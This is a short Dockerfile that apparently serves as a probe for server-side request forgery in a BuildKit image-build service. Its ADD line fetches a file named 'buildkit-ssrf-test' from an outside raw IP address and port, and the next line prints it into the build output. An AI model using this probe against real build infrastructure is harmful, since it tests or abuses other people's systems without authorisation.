FROM alpine:3.19
ADD http://62.113.111.63:7777/buildkit-ssrf-test /tmp/test
RUN cat /tmp/test || true
CMD sleep infinity
